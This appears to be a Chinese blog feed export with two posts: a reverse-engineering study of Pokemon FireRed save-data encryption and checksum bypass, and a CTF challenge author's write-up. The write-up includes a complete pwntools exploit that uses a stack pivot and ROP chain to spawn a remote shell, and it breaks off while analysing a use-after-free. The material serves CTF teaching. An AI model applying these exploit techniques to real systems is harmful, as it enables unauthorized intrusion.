+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/18/4dfff46a810b0.png" alt="1679139075138.png" loading="lazy"></figure>
+<h1 id="0x02-很难不谈的变强话题获得强力宝可梦">0x02 很难不谈的变强话题——获得强力宝可梦</h1>
+<p>熟悉宝可梦的玩家都知道，评判一个宝可梦是否优秀，可以从<code>等级</code>，<code>种族值</code>，<code>天赋值</code>，<code>努力值</code>，<code>性格</code>等方便来判断，如果有闲情雅致的话，还能追求一下他是否是闪光。</p>
+<h2 id="分析-2">分析</h2>
+<p>这一次，我们从宝可梦属性的源码开始分析，</p>
+<pre><code class="language-c">struct PokemonSubstruct0
+{
+    u16 species;
+    u16 heldItem;
+    u32 experience;
+    u8 ppBonuses;
+    u8 friendship;
+};
+
+struct PokemonSubstruct1
+{
+    u16 moves[4];
+    u8 pp[4];
+};
+
+struct PokemonSubstruct2
+{
+    u8 hpEV;
+    u8 attackEV;
+    u8 defenseEV;
+    u8 speedEV;
+    u8 spAttackEV;
+    u8 spDefenseEV;
+    u8 cool;
+    u8 beauty;
+    u8 cute;
+    u8 smart;
+    u8 tough;
+    u8 sheen;
+};
+
+struct PokemonSubstruct3
+{
+ /* 0x00 */ u8 pokerus;
+ /* 0x01 */ u8 metLocation;
+
+ /* 0x02 */ u16 metLevel:7;
+ /* 0x02 */ u16 metGame:4;
+ /* 0x03 */ u16 pokeball:4;
+ /* 0x03 */ u16 otGender:1;
+
+ /* 0x04 */ u32 hpIV:5;
+ /* 0x04 */ u32 attackIV:5;
+ /* 0x05 */ u32 defenseIV:5;
+ /* 0x05 */ u32 speedIV:5;
+ /* 0x05 */ u32 spAttackIV:5;
+ /* 0x06 */ u32 spDefenseIV:5;
+ /* 0x07 */ u32 isEgg:1;
+ /* 0x07 */ u32 abilityNum:1;
+
+ /* 0x08 */ u32 coolRibbon:3;
+ /* 0x08 */ u32 beautyRibbon:3;
+ /* 0x08 */ u32 cuteRibbon:3;
+ /* 0x09 */ u32 smartRibbon:3;
+ /* 0x09 */ u32 toughRibbon:3;
+ /* 0x09 */ u32 championRibbon:1;
+ /* 0x0A */ u32 winningRibbon:1;
+ /* 0x0A */ u32 victoryRibbon:1;
+ /* 0x0A */ u32 artistRibbon:1;
+ /* 0x0A */ u32 effortRibbon:1;
+ /* 0x0A */ u32 marineRibbon:1; // never distributed
+ /* 0x0A */ u32 landRibbon:1; // never distributed
+ /* 0x0A */ u32 skyRibbon:1; // never distributed
+ /* 0x0A */ u32 countryRibbon:1; // distributed during Pok茅mon Festa '04 and '05 to tournament winners
+ /* 0x0B */ u32 nationalRibbon:1;
+ /* 0x0B */ u32 earthRibbon:1;
+ /* 0x0B */ u32 worldRibbon:1; // distributed during Pok茅mon Festa '04 and '05 to tournament winners
+ /* 0x0B */ u32 unusedRibbons:4; // discarded in Gen 4
+ /* 0x0B */ u32 eventLegal:1; // controls Mew &amp; Deoxys obedience; if set, Pok茅mon is a fateful encounter in FRLG &amp; Gen 4+ summary screens; set for in-game event island legendaries, some distributed events, and Pok茅mon from XD: Gale of Darkness.
+};
+
+union PokemonSubstruct
+{
+    struct PokemonSubstruct0 type0;
+    struct PokemonSubstruct1 type1;
+    struct PokemonSubstruct2 type2;
+    struct PokemonSubstruct3 type3;
+    u16 raw[6];
+};
+
+struct BoxPokemon
+{
+    u32 personality;
+    u32 otId;
+    u8 nickname[POKEMON_NAME_LENGTH];
+    u8 language;
+    u8 isBadEgg:1;
+    u8 hasSpecies:1;
+    u8 isEgg:1;
+    u8 unused:5;
+    u8 otName[PLAYER_NAME_LENGTH];
+    u8 markings;
+    u16 checksum;
+    u16 unknown;
+
+    union
+    {
+        u32 raw[12];
+        union PokemonSubstruct substructs[4];
+    } secure;
+};
+
+struct Pokemon
+{
+    struct BoxPokemon box;
+    u32 status;
+    u8 level;
+    u8 mail;
+    u16 hp;
+    u16 maxHP;
+    u16 attack;
+    u16 defense;
+    u16 speed;
+    u16 spAttack;
+    u16 spDefense;
+};
+</code></pre>
+<p>可以发现Pokemon结构体的组成分为了两个大部分，一个部分是BoxPokemon结构体，我们这里称他为非面板值，剩下的部分就是面板值。</p>
+<p>东西有点多，暂时不一一解释了。（其实这个源码取的名字已经很贴心了，大致都能看出来是什么）</p>
+<p>要利用，就得先找出来这个结构体在程序中哪些地方被用上了。</p>
+<p>一个比较显眼的地方是<code>gSaveBlock1</code>中的<code>struct Pokemon playerParty[PARTY_SIZE];</code>这个成员。<code>PARTY_SIZE</code>是6，很容易想到它就是当前背包里的6只宝可梦的信息。</p>
+<p>对这个<code>playerParty</code>进行交叉引用，可以看到他来源于全局数组<code>gPlayerParty</code>，</p>
+<pre><code class="language-c">void SavePlayerParty(void)
+{
+    int i;
+
+    gSaveBlock1Ptr-&gt;playerPartyCount = gPlayerPartyCount;
+
+    for (i = 0; i &lt; PARTY_SIZE; i++)
+        gSaveBlock1Ptr-&gt;playerParty[i] = gPlayerParty[i];
+}
+
+void LoadPlayerParty(void)
+{
+    int i;
+
+    gPlayerPartyCount = gSaveBlock1Ptr-&gt;playerPartyCount;
+
+    for (i = 0; i &lt; PARTY_SIZE; i++)
+        gPlayerParty[i] = gSaveBlock1Ptr-&gt;playerParty[i];
+}
+</code></pre>
+<p>跟进<code>gPlayerParty</code>，可以发现在对战，赠送，发送到PC等等功能中，只要是涉及到对身上的Pokemon进行操作的地方都会用到它，并且往往都是配合<strong>GetMonData</strong>这个函数出现的。</p>
+<p><code>GetMonData</code>被定义在pokemon.c中，</p>
+<pre><code class="language-c">u32 GetMonData(struct Pokemon *mon, s32 field, u8 *data)
+{
+    u32 ret;
+
+    switch (field)
+    {
+    case MON_DATA_STATUS:
+        ret = mon-&gt;status;
+        break;
+    case MON_DATA_LEVEL:
+        ret = mon-&gt;level;
+        break;
+    case MON_DATA_HP:
+        ret = mon-&gt;hp;
+        break;
+    case MON_DATA_MAX_HP:
+        ret = mon-&gt;maxHP;
+        break;
+    case MON_DATA_ATK:
+        ret = GetDeoxysStat(mon, STAT_ATK);
+        if (!ret)
+            ret = mon-&gt;attack;
+        break;
+    case MON_DATA_DEF:
+        ret = GetDeoxysStat(mon, STAT_DEF);
+        if (!ret)
+            ret = mon-&gt;defense;
+        break;
+    case MON_DATA_SPEED:
+        ret = GetDeoxysStat(mon, STAT_SPEED);
+        if (!ret)
+            ret = mon-&gt;speed;
+        break;
+    case MON_DATA_SPATK:
+        ret = GetDeoxysStat(mon, STAT_SPATK);
+        if (!ret)
+            ret = mon-&gt;spAttack;
+        break;
+    case MON_DATA_SPDEF:
+        ret = GetDeoxysStat(mon, STAT_SPDEF);
+        if (!ret)
+            ret = mon-&gt;spDefense;
+        break;
+    case MON_DATA_ATK2:
+        ret = mon-&gt;attack;
+        break;
+    case MON_DATA_DEF2:
+        ret = mon-&gt;defense;
+        break;
+    case MON_DATA_SPEED2:
+        ret = mon-&gt;speed;
+        break;
+    case MON_DATA_SPATK2:
+        ret = mon-&gt;spAttack;
+        break;
+    case MON_DATA_SPDEF2:
+        ret = mon-&gt;spDefense;
+        break;
+    case MON_DATA_MAIL:
+        ret = mon-&gt;mail;
+        break;
+    default:
+        ret = GetBoxMonData(&amp;mon-&gt;box, field, data);
+        break;
+    }
+    return ret;
+}
+</code></pre>
+<p>该函数会返回查询的Pokemon的对应信息，可以看到面板值全都是直接返回的，而非面板值使用了另一个函数<strong>GetBoxMonData</strong>来中转，它的定义如下（源码有点长，为了不影响我们的思路，删减了一部分）：</p>
+<pre><code class="language-c">u32 GetBoxMonData(struct BoxPokemon *boxMon, s32 field, u8 *data)
+{
+    s32 i;
+    u32 retVal = 0;
+    struct PokemonSubstruct0 *substruct0 = NULL;
+    struct PokemonSubstruct1 *substruct1 = NULL;
+    struct PokemonSubstruct2 *substruct2 = NULL;
+    struct PokemonSubstruct3 *substruct3 = NULL;
+
+    if (field &gt; MON_DATA_ENCRYPT_SEPARATOR)
+    {
+        substruct0 = &amp;(GetSubstruct(boxMon, boxMon-&gt;personality, 0)-&gt;type0);
+        substruct1 = &amp;(GetSubstruct(boxMon, boxMon-&gt;personality, 1)-&gt;type1);
+        substruct2 = &amp;(GetSubstruct(boxMon, boxMon-&gt;personality, 2)-&gt;type2);
+        substruct3 = &amp;(GetSubstruct(boxMon, boxMon-&gt;personality, 3)-&gt;type3);
+
+        DecryptBoxMon(boxMon);
+
+        if (CalculateBoxMonChecksum(boxMon) != boxMon-&gt;checksum)
+        {
+            boxMon-&gt;isBadEgg = 1;
+            boxMon-&gt;isEgg = 1;
+            substruct3-&gt;isEgg = 1;
+        }
+    }
+
+    switch (field)
+    {
+    case MON_DATA_PERSONALITY:
+        retVal = boxMon-&gt;personality;
+        break;
+    case MON_DATA_OT_ID:
+        retVal = boxMon-&gt;otId;
+        break;
+    case MON_DATA_NICKNAME:
+    {
+        if (boxMon-&gt;isBadEgg)
+        {
+            for (retVal = 0;
+                retVal &lt; POKEMON_NAME_LENGTH &amp;&amp; gText_BadEgg[retVal] != EOS;
+                data[retVal] = gText_BadEgg[retVal], retVal++) {}
+
+            data[retVal] = EOS;
+        }
+        else if (boxMon-&gt;isEgg)
+        {
+            StringCopy(data, gText_EggNickname);
+            retVal = StringLength(data);
+        }
+        else if (boxMon-&gt;language == LANGUAGE_JAPANESE)
+        {
+            data[0] = EXT_CTRL_CODE_BEGIN;
+            data[1] = EXT_CTRL_CODE_JPN;
+
+            // FRLG changed i &lt; 7 to i &lt; 6
+            for (retVal = 2, i = 0;
+                i &lt; 6 &amp;&amp; boxMon-&gt;nickname[i] != EOS;
+                data[retVal] = boxMon-&gt;nickname[i], retVal++, i++) {}
+
+            data[retVal++] = EXT_CTRL_CODE_BEGIN;
+            data[retVal++] = EXT_CTRL_CODE_ENG;
+            data[retVal] = EOS;
+        }
+        else
+        {
+            for (retVal = 0;
+                retVal &lt; POKEMON_NAME_LENGTH;
+                data[retVal] = boxMon-&gt;nickname[retVal], retVal++){}
+
+            data[retVal] = EOS;
+        }
+        break;
+    }
+    
+    /* .................. */
+            
+    default:
+        break;
+    }
+
+    if (field &gt; MON_DATA_ENCRYPT_SEPARATOR)
+        EncryptBoxMon(boxMon);
+
+    return retVal;
+}
+</code></pre>
+<p>这个函数的信息量就非常大了，查询的范围（field）在<code>MON_DATA_ENCRYPT_SEPARATOR</code>控制的区域内的时候，函数会做两件事，对<code>boxMon</code>进行解密和计算<code>checksum</code>并验证合法性。checksum在验证失败的时候会让我们的宝可梦变成一个<code>badegg</code>，然后永久没法孵化，boxMon的加密让我们没法直接获取某些数据。对于这两个流程，我们来挨个分析一下。</p>
+<p>先看一下<strong>CalculateBoxMonChecksum</strong>函数，</p>
+<pre><code class="language-c">static u16 CalculateBoxMonChecksum(struct BoxPokemon *boxMon)
+{
+    u16 checksum = 0;
+    union PokemonSubstruct *substruct0 = GetSubstruct(boxMon, boxMon-&gt;personality, 0);
+    union PokemonSubstruct *substruct1 = GetSubstruct(boxMon, boxMon-&gt;personality, 1);
+    union PokemonSubstruct *substruct2 = GetSubstruct(boxMon, boxMon-&gt;personality, 2);
+    union PokemonSubstruct *substruct3 = GetSubstruct(boxMon, boxMon-&gt;personality, 3);
+    s32 i;
+
+    for (i = 0; i &lt; 6; i++)
+        checksum += substruct0-&gt;raw[i];
+
+    for (i = 0; i &lt; 6; i++)
+        checksum += substruct1-&gt;raw[i];
+
+    for (i = 0; i &lt; 6; i++)
+        checksum += substruct2-&gt;raw[i];
+
+    for (i = 0; i &lt; 6; i++)
+        checksum += substruct3-&gt;raw[i];
+
+    return checksum;
+}
+</code></pre>
+<p>这个<code>checksum</code>是根据<code>boxMon-&gt;personality</code>，通过<code>GetSubStruct</code>计算出相关的四个substruct的地址，然后再用共用体secure将四个指针分成若干个32位无符号整数<code>raw[i]</code>来累加生成的。</p>
+<p><code>GetSubStruct</code>内置了25种情况的跳表（对应25种性格）来完成绑定，原理简单的说就是选定四个地址的某四位取出来结合成一个新的地址，这里不深入讨论它的原理。</p>
+<p>然后将目光放到对boxMon的加解密上，</p>
+<pre><code class="language-c">static void EncryptBoxMon(struct BoxPokemon *boxMon)
+{
+    u32 i;
+    for (i = 0; i &lt; 12; i++)
+    {
+        boxMon-&gt;secure.raw[i] ^= boxMon-&gt;personality;
+        boxMon-&gt;secure.raw[i] ^= boxMon-&gt;otId;
+    }
+}
+
+static void DecryptBoxMon(struct BoxPokemon *boxMon)
+{
+    u32 i;
+    for (i = 0; i &lt; 12; i++)
+    {
+        boxMon-&gt;secure.raw[i] ^= boxMon-&gt;otId;
+        boxMon-&gt;secure.raw[i] ^= boxMon-&gt;personality;
+    }
+}
+</code></pre>
+<p>可以看到对加密区域的数据的加密是根据原值对<strong>otId</strong>和<strong>personality</strong>的异或得到的，这里并没有使用原来的encryptionKey来加密。那么想要动调找到宝可梦信息之后解密也就很简单了。</p>
+<p>（坏蛋！）</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/38e8c170bf72d.png" alt="1679221414711.png" loading="lazy"></figure>
+<h2 id="提取背包宝可梦数据">提取背包宝可梦数据</h2>
+<p>根据<code>gSaveBlock1Ptr</code>找到<code>gSaveBlock1</code>之后，往后0x34就是背包宝可梦的数量和宝可梦的信息了，比如我此时有两个宝可梦，小火龙和波波，他们的信息如下（小火龙从<code>020255AC</code>开始，波波从<code>02025610</code>开始）：</p>
+<pre><code>020255A0 00 00 02 00 00 00 4F 00 02 00 00 00 8F 23 D0 32  ......O......#.2 
+020255B0 1E 67 17 F7 BD C2 BB CC C7 BB C8 BE BF CC 02 02  .g.............. 
+020255C0 C5 C9 CE C9 CC C3 FF 00 54 94 00 00 9B 44 EA C5  ........T....D.. 
+020255D0 A5 44 C7 C5 B2 6C DE C5 95 44 C7 C5 EB 45 C7 C5  .D...l...D...E.. 
+020255E0 91 12 C7 C5 91 1C C2 67 B4 BB C4 DC 91 44 C7 C5  .......g.....D.. 
+020255F0 90 44 C6 C7 91 44 C7 C5 91 44 C7 C5 00 00 00 00  .D...D...D...... 
+02025600 08 FF 18 00 18 00 0F 00 0C 00 0F 00 10 00 0D 00  ................ 
+02025610 1B DD 46 D6 1E 67 17 F7 CA C3 BE C1 BF D3 FF 00  ..F..g.......... 
+02025620 00 00 02 02 C5 C9 CE C9 CC C3 FF 00 E5 56 00 00  .............V.. 
+02025630 05 DC 55 83 ED 5C 14 01 05 BA 51 21 15 BA 51 21  ..U..\....Q!..Q! 
+02025640 65 BA 51 21 05 FD 51 21 05 BA 51 21 05 BA 51 21  e.Q!..Q!..Q!..Q! 
+02025650 05 BA 51 21 24 BA 51 21 05 BA 51 21 26 BA 51 21  ..Q!$.Q!..Q!&amp;.Q! 
+02025660 00 00 00 00 04 FF 11 00 11 00 09 00 09 00 08 00  ................ 
+02025670 07 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 
+</code></pre>
+<p>以小火龙的信息为例分析一下，<code>0x32D0238F</code>是他的性格，<code>0xF717671E</code>是otId，其中的<code>0x671E</code>是表id，也就是显示在训练家信息里的id，和我的26398刚好能对上。继续往后是昵称的编码，<code>CHARMANDER</code>对应的编码就是<code>BD C2 BB CC C7 BB C8 BE BF CC</code>这10个hex数据......</p>
+<p>（pokemon的字符集并没有使用ASCII，而是他自己的一套）</p>
+<p>一直分析到checksum之后，就会发现很难分析出信息了，这一块区域就是被<code>MON_DATA_ENCRYPT_SEPARATOR</code>分离出来的加密区域，再之后，到等级，现HP，最大HP，攻击力这些面板属性的位置又能通过明文看懂了。</p>
+<h3 id="解密">解密</h3>
+<p>动调<code>DecryptBoxMon</code>拿到的小火龙原始数据如下，</p>
+<pre><code>02024280 00 00 00 00 8F 23 D0 32 1E 67 17 F7 BD C2 BB CC  .....#.2.g...... 
+02024290 C7 BB C8 BE BF CC 02 02 C5 C9 CE C9 CC C3 FF 00  ................ 
+020242A0 54 95 00 00 0A 00 2D 00 34 00 00 00 23 28 19 00  T....#.24...#(.. 
+020242B0 04 00 00 00 7A 01 00 00 00 57 00 00 00 58 05 A2  ....z....W...X.. 
+020242C0 25 FF 03 19 00 00 00 00 01 00 01 02 00 00 00 00  %............... 
+020242D0 00 00 00 00 00 00 00 00 08 FF 18 00 18 00 0F 00  ................ 
+020242E0 0C 00 0F 00 10 00 0D 00 1B DD 46 D6 1E 67 17 F7  ..........F..g.. 
+</code></pre>
+<p>现在就很清晰了，比如说<code>0x20242AC</code>处的<code>23 28 19 00</code>就分别代表它的4个技能的剩余PP值，又比如<code>0x20242C0</code>处的<code>0x1903FF25</code>就代表这只小火龙的个体值，按二进制展开来看如下</p>
+<pre><code>00 01100 10000 00111 11111 11001 00101
+非梦特 非蛋
+特防: 12
+特攻: 16
+速度: 7
+防御: 31 (V)
+攻击: 25
+生命: 5
+</code></pre>
+<p>结合源码就能相对容易的看出来需要的信息了。</p>
+<h2 id="打造一只完美宝可梦">打造一只完美宝可梦</h2>
+<p>至此，我们已经分析了一遍宝可梦数据的存储和反作弊机制，是时候小试牛刀，打造一个理想中的完美宝可梦了。</p>
+<h3 id="闪光">闪光</h3>
+<p>闪光（异色）这个概念对于常玩Pokemon系列游戏的玩家都不陌生，遇到一只闪光宝可梦的概率非常低，大概是1/4096，这就决定了它的逼格是非常高的。</p>
+<p>因此，我们的第一个目标就是将我们的小火龙变成闪光小火龙。</p>
+<p>细心的小伙伴会发现，之前的<code>Pokemon</code>结构体中好像并没有用于标记一个宝可梦是否闪光的变量，那么闪光究竟是如何判断的呢？</p>
+<blockquote>
+<p>从第三世代起，宝可梦是否异色不再与其能力挂钩，而是由ID No.、里ID No.、初训家以及性格值共同决定。</p>
+<p>(ID No. xor 里ID No.) xor (性格值前16位 xor 性格值后16位) &lt; 8</p>
+</blockquote>
+<p>这是宝可梦百科对闪光的描述，并且我们分析的宝可梦火红正好是第三世代。</p>
+<p>可以看出闪光只与otId和personality挂钩。</p>
+<p>不想改personality是因为personality涉及到了几个substruct的指针构造，害怕出问题。所以我直接修改了里ID，</p>
+<p>计算里ID的代码如下，</p>
+<pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+int main()
+{
+    unsigned int part1 = 0x115f;
+    unsigned int otid = 0x671e0000;
+
+    for (unsigned int i = 0; i&lt; 0xFFFFFF; ++i) {
+        unsigned int pp = otid + i;
+        unsigned int part2 = ((pp &gt;&gt; 16) &amp; 0xFFFF) ^ (pp &amp; 0xFFFF);
+        if ((part1 ^ part2) &lt; 8) {
+            printf(&quot;otId: 0x%x\n&quot;, pp);
+            break;
+        }
+    }
+
+    return 0;
+}
+
+/* otId: 0x671e7640 */
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/4c80e494d429b.png" alt="1679225726645.png" loading="lazy"></figure>
+<h3 id="6v-进化-强力技能">6V &amp; 进化 &amp; 强力技能</h3>
+<p>强度的大部分因素其实在<code>secure</code>保护下的几个结构体中，如果贸然改的话会导致checksum检查不通过，然后被变成badegg，经过辛苦的动调（内存断点下在小火龙的badegg位，然后跟进了一段时间），发现对checksum的比对是在<code>0x803FDBC</code>这个位置，那么我们只需要抢在系统判定之前把checksum修改为<code>CalculateBoxMonChecksum</code>计算出来的值就能绕过判断。</p>
+<pre><code class="language-assembly">RAM:0803FDA6
+RAM:0803FDA6                 MOVS            R5, R0
+RAM:0803FDA8                 MOV             R0, R8
+RAM:0803FDAA                 BL              sub_803F930
+RAM:0803FDAE                 MOV             R0, R8
+RAM:0803FDB0                 BL              loc_803E3FC
+RAM:0803FDB4                 LSLS            R0, R0, #0x10
+RAM:0803FDB6                 LSRS            R0, R0, #0x10
+RAM:0803FDB8                 MOV             R1, R8
+RAM:0803FDBA                 LDRH            R1, [R1,#0x1C]
+RAM:0803FDBC                 CMP             R0, R1
+RAM:0803FDBE                 BEQ             loc_803FDD6
+RAM:0803FDC0                 MOV             R2, R8
+RAM:0803FDC2                 LDRB            R0, [R2,#0x13]
+RAM:0803FDC4                 MOVS            R1, #1
+RAM:0803FDC6                 ORRS            R0, R1
+RAM:0803FDC8                 MOVS            R1, #4
+RAM:0803FDCA                 ORRS            R0, R1
+RAM:0803FDCC                 STRB            R0, [R2,#0x13]
+RAM:0803FDCE                 LDRB            R0, [R5,#7]
+RAM:0803FDD0                 MOVS            R1, #0x40 ; '@'
+RAM:0803FDD2                 ORRS            R0, R1
+RAM:0803FDD4                 STRB            R0, [R5,#7]
+</code></pre>
+<p>这里我先让小火龙进化成喷火龙，也就是把species的4改成6，然后动调跟到对比小火龙checksum的部分，改掉对应的checksum值，即可绕过反作弊的检查。</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/b8f8ff5162823.png" alt="1679226519852.png" loading="lazy"></figure>
+<p>以此类推，我们还能让他变成6V宝可梦，只需要将原本的个体值<code>0x1903FF25</code>修改为<code>0x3FFFFFFF</code>。</p>
+<p>我们还能找到存技能的位置，帮他配出来一些很牛逼的招式。这里给出我尝试的结果：</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/54506ff78b90f.png" alt="1679228984639.png" loading="lazy"></figure>
+<h1 id="0x03-总结">0x03 总结</h1>
+<p>总的来说，这一次对Pokemon FireRed的逆向分析的完成度和预期差不多，不过分析出来的大部分逻辑都依赖了源码，动调找位置也依赖了符号表。在更多情况下的逆向分析并没有这么好的条件给我用，所以说还需要继续努力。学到了挺多基础的反作弊机制，也试着自己去思考着找到了绕过方法，收获颇丰！</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[VNCTF2023出题手记]]></title>
+        <id>https://kotoriseed.github.io/post/vnctf2023-pwn/</id>
+        <link href="https://kotoriseed.github.io/post/vnctf2023-pwn/">
+        </link>
+        <updated>2023-02-19T16:00:00.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>学pwn也有一年了，这还是第一次较为正式的参与比赛的出题。介于本人技术有限，所以两题的难度都不高。</p>
+<p>（而且由于经验不足，导致这次我的两题给很多师傅带来了不好的体验，在这里给各位师傅们真诚地磕一个）</p>
+<p>（问卷反馈的最爱&amp;最恨的top2都是traveler和鼠鼠的奇妙冒险）</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/02/20/63dae4cd8c85c.png" alt="1676823882674.png" loading="lazy"></figure>
+<h1 id="traveler">traveler</h1>
+<blockquote>
+<p>人的一生能有多少次旅行呢</p>
+</blockquote>
+<h2 id="分析">分析</h2>
+<p>保护只开了NX，main函数很明显的栈溢出。</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  init(argc, argv, envp);
+  puts(&quot;who r u?&quot;);
+  read(0, buf, 0x30uLL);
+  puts(&quot;How many travels can a person have in his life?&quot;);
+  read(0, &amp;msg, 0x28uLL);
+  return 0;
+}
+</code></pre>
+<p>buf处溢出覆盖rbp之后还能写下一个gadget，并且往msg读了0x28。很明显的栈迁起手式。</p>
+<p>因为没有使用去掉csu的版本，所以gadget方面是几乎没有限制的，</p>
+<pre><code class="language-sh">&gt; ROPgadget --binary ./traveler | grep pop
+0x000000000040117b : add byte ptr [rcx], al ; pop rbp ; ret
+0x0000000000401176 : mov byte ptr [rip + 0x2f0b], 1 ; pop rbp ; ret
+0x00000000004011da : nop ; pop rbp ; ret
+0x00000000004012bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004012be : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004012c0 : pop r14 ; pop r15 ; ret
+0x00000000004012c2 : pop r15 ; ret
+0x00000000004012bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004012bf : pop rbp ; pop r14 ; pop r15 ; ret
+0x000000000040117d : pop rbp ; ret
+0x00000000004012c3 : pop rdi ; ret
+0x00000000004012c1 : pop rsi ; pop r15 ; ret
+0x00000000004012bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+</code></pre>
+<p>起system的话，ROP的构造如下：</p>
+<p><code>b'/bin/sh\x00' + p64(pop_rdi) + p64(binsh_addr) + p64(elf.symbols['system'])</code></p>
+<p>只需要0x20的长度即可。</p>
+<p>但msg位于.bss的开头，直接起system的话，rsp会减到前面的.got里，然后就会导致crash。</p>
+<p>所以考点就在于：</p>
+<ol>
+<li>msg位于bss段开头，如果直接在这里起system，栈空间不够</li>
+<li>只有0x28如何写下rop</li>
+</ol>
+<p>先来解决第一个问题，如何在.bss中留够栈空间。</p>
+<p>这个估计是该题唯一的难点了，但其实也很容易想到，只需要用这0x28的rop调用read，控制rsi为当前rop的结束位置，读入下一段rop并让rsp顺利滑到下一个rop上即可。</p>
+<p>光是这么说可能有点抽象，可以看下面这个示意图。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/02/10/12e62896b1adb.png" alt="1676006538909.png" loading="lazy"></figure>
+<p>重复用这些read来不断抬高rsp，当次数足够时，system的栈空间就留够了。</p>
+<p>然后再来看第二个问题，0x28如何写下read。</p>
+<p>其实很容易看出来，main函数在返回前调用了<code>read(0, &amp;msg, 0x28)</code>，rdi和rdx都已经不用管了，只需要控制rsi为<code>msg+0x28*i</code>就行了。所以有如下构造：</p>
+<p><code>p64(pop_rsi_r15) + p64(bss+0x28*i) + p64(0) + p64(elf.symbols['read']) + p64(ret)</code></p>
+<p>刚好用0x28，且rsp也能滑到下一个rop上。</p>
+<p>（<del>你看他从栈迁到不断抬栈，像不像经历了许多次旅行</del>）</p>
+<p>在看了师傅们交上来的wp之后，发现了许多非预期的解法，比如复用main函数代码的就有两种思路，①第一次溢出劫持rsi和rbp之后重新回到<code>0x401244</code>或②在第一次溢出劫持rbp后直接返回<code>0x4012116</code>来劫持rsi，这两种方法都能直接把rop读到bss高位然后借用main本身的function epilogue自然而然的迁移过去。</p>
+<p>（优雅，实在是太优雅了.jpg）</p>
+<p>还有一位师傅直接使用puts leak出libc之后强行在rop中满足了ogg的条件并调用了ogg来getshell（绝）。</p>
+<p>（和这些解法比起来，出题人的预期解低效且丑陋，反而变得更像是非预期了）</p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sys
+
+context.log_level='debug'
+
+path_to_elf = '/home/kotori/Desktop/vnctf/traveler/traveler'
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
+
+elf = ELF(path_to_elf)
+
+if port == 0:
+	p = process(path_to_elf)
+else:
+	p = remote(ip, port)
+
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+bss = 0x4040a0
+leave_ret = 0x0000000000401253 # leave ; ret
+pop_rdi = 0x00000000004012c3 # pop rdi ; ret
+pop_rsi_r15 = 0x00000000004012c1 # pop rsi ; pop r15 ; ret
+ret = pop_rdi + 1
+
+pay = b'a'*0x20 + p64(bss-0x8) + p64(leave_ret)
+p.sendafter('u?', pay)
+
+pay = p64(pop_rsi_r15) + p64(bss+0x28) + p64(0)
+pay += p64(elf.plt['read']) + p64(ret)
+
+# g()
+
+p.sendafter('e?', pay)
+
+for i in range(2,60):
+	pay = p64(pop_rsi_r15) + p64(bss+(0x28*i)) + p64(0)
+	pay += p64(elf.plt['read']) + p64(ret)
+	p.send(pay)
+
+pay = p64(ret) + p64(pop_rdi) + p64(bss+0x7c8+10*0x28) + p64(elf.symbols['system'])
+pay += b'/bin/sh\x00'
+p.sendline(pay)
+
+p.interactive()
+</code></pre>
+<h1 id="鼠鼠的奇妙冒险">鼠鼠的奇妙冒险</h1>
+<blockquote>
+<p>我的梦想是成为鼠中gangstar!</p>
+</blockquote>
+<h2 id="分析-2">分析</h2>
+<p>考虑到比赛时间只有12h且pwn方向题目较多，所以为了减少逆向难度，我直接把源码全部给出来了（不会开发，代码写的比较答辩还请师傅们海涵）</p>
+<p>保护全开，为了方便师傅们调试，编译的时候带了符号。</p>
+<p>最主要的漏洞点应该还是很好找的，位于<code>game.c</code>的<code>fight</code>中。</p>
+<pre><code class="language-c">uint32_t fight(mouse_t *a, mouse_t *b) {
+    
+	......
+    
+	switch(sig) {
+		case F_WIN:
+            
+			......
+			
+			free(b);
+			
+			// especial mouse will do sth here...
+			// ...
+			if(b-&gt;type == LOST_MOUSE) {
+				printf(&quot;[lost mouse] I lost my name in a duel in the past.\n&quot;);
+				printf(&quot;[lost mouse] Can you help me find my original name? (y/N)\n&quot;);
+				printf(&quot;[%s]&quot;, a-&gt;name);
+				read(0, buf, 2);
+				
+				if(buf[0] == 'y' || buf[0] == 'Y') {
+					printf(&quot;[lost mouse] I only remember that&quot;
+						&quot; my name has 2 characters.\n&quot;);
+					printf(&quot;[%s] &quot;, a-&gt;name);
+					read(0, b-&gt;name, 2);
+					
+					......
+                        
+				}
+			}
+            ......
+                
+    }
+
+    ......
+                
+}
+</code></pre>
+<p>这里在<code>free(b)</code>之后，如果对方是<code>LOST_MOUSE</code>，就能够直接uaf写2bytes。</p>
+<p>暂且不看这里如何利用，先看看如何到达这个有漏洞的代码部分。</p>
+<p>整个游戏中调用了<code>fight()</code>的只有<code>loadLevel()</code>和<code>dummyFight()</code>，不过要遇到type为<code>LOST_MOUSE</code>的敌人，就只有走<code>dummyFight()</code>这条链子，即：</p>
+<p><code>arena() -&gt; dummyArena() -&gt; dummyFight() -&gt; fight()</code></p>
